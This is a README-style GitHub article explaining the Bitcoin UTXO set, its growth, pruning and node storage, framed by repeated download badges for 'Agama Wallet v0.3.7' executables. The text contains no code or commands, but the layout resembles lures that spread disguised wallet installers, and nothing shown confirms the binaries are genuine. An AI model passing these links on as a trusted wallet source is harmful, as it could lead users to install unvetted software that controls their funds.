[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# The Bitcoin UTXO Set: What It Is and Why It Grows

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

The UTXO set is the collection of every bitcoin output that exists and has not been spent. It is the state a node must hold to validate new transactions, and it grows as outputs are created and shrinks as they are consumed. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and its UTXO chains keep the same kind of set, smaller and separate.

## You'll see this if

A node's data directory is far larger than the chain's history suggests it should be, or you have read that the set is "growing forever" and want to know what that implies for running a node.

| Question | Answer |
|---|---|
| Is the UTXO set the blockchain? | No, it is the spendable state derived from it |
| Does it only grow? | It grows and shrinks; consolidation reduces its size |
| Can it be pruned? | Pruning removes old blocks, not the current set |
| Does a wallet hold the whole set? | No, only the outputs it can spend |

No current size figure is stated here: the number changes constantly and any figure would be stale before it was read. A node reports its own view.

## Why it happens

Every confirmed transaction deletes the outputs it spends and adds the outputs it creates. The net effect on the set depends on how many outputs a transaction produces versus consumes: a payment with two inputs and two outputs leaves the count unchanged, while a consolidation of fifty outputs into one removes forty-nine entries.

The set is also why a wallet's own "coin count" never matches the network's: a wallet sees the outputs paying addresses it derived, while a node sees every unspent output on the chain, including those belonging to wallets that will never be opened again.

Growth comes from usage patterns rather than from the protocol:

- **Change-heavy spending.** Each payment that creates change adds an entry that will sit unspent until it is used.
- **Small deposits.** Exchanges and services that pay out in many small amounts create outputs that persist.
- **Dust and abandoned wallets.** Outputs too small to be worth spending remain in the set indefinitely, because nothing forces them out.

The set matters because validation depends on it. A node checking a new transaction must confirm that each input exists in the set and is unspent, which is why the set is kept in a database optimised for lookups rather than in the block files.

## Fix

There is nothing to repair on a chain you do not operate. For a node, the practical steps are about expectations and disk.

1. **Measure the set on your own node.** Tools that ship with the node report the count and the on-disk size; those numbers are current and local.
2. **Budget disk for the set as well as the blocks.** They are separate consumers and both grow.
3. **Prune blocks if disk is the constraint.** Pruning discards old block data after validation; it does not reduce the current set.
4. **Do not expect consolidation to help the network.** Merging your own outputs reduces your future fees and, marginally, the set; it does nothing for anyone else's.
5. **Re-check after a major upgrade.** Node software periodically changes how the set is stored, and the on-disk figure can move without the count changing.

For the wallet-level version of the same question, [UTXOs in Bitcoin](https://github.com/agama-wallet/utxo/blob/main/how-bitcoin-holds-coins.md) covers inputs, change and fees.

## If that did not work

If a node reports a set size that seems implausible after a restart, let it finish starting up before reading the figure: the database is opened and verified during startup, and an early reading can reflect a partial state.

If disk fills during initial sync, the constraint is usually block storage rather than the set, and pruning configured before the sync completes is the remedy. Changing the setting afterwards requires a re-sync.

If a wallet claims to show "the UTXO set" as a feature, it is almost certainly showing the outputs that wallet controls, not the network's set. The two are different objects with the same name.

## Prevention

- **Plan storage for growth.** The set has grown for as long as the chain has existed.
- **Keep node software current.** Storage formats change and older versions can be slower or larger for the same data.
- **Avoid dust creation where you control the sending side.** An output too small to spend is a permanent entry.
- **Separate "chain size" from "set size" in your notes.** They answer different questions and grow at different rates.
- **Check the count after consolidation campaigns.** It is the one place a wallet user can see their own effect, and [UTXO management](https://github.com/agama-wallet/utxo/blob/main/consolidating-your-coins.md) explains how to run one without overpaying.

## FAQ

### Does the UTXO set include spent outputs?

No. An output leaves the set the moment a transaction spending it is confirmed. Spent outputs remain in the block history, which is a different store.

### Is the UTXO set stored in every block?

No. Blocks contain the transactions; the set is the state those transactions produce, maintained outside the blocks and rebuilt from them during a full sync.

### Can the set shrink?

Yes, whenever a transaction consumes more outputs than it creates. Consolidation transactions do exactly that, which is why the trend is growth rather than monotonic increase.

### Why do some chains keep a smaller set than Bitcoin?

Because they have less usage, fewer small outputs, or a different accounting model entirely. [Which blockchains use UTXO accounting](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md) shows who is in the same family.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [UTXOs in Bitcoin: How Coins Are Actually Held](https://github.com/agama-wallet/utxo/blob/main/how-bitcoin-holds-coins.md)
- [What Is a UTXO? Unspent Transaction Outputs Explained](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md)
- [Which Blockchains Use the UTXO Model](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md)
- [Open-Source UTXO Projects Worth Reading](https://github.com/agama-wallet/utxo/blob/main/open-source-projects-worth-reading.md)
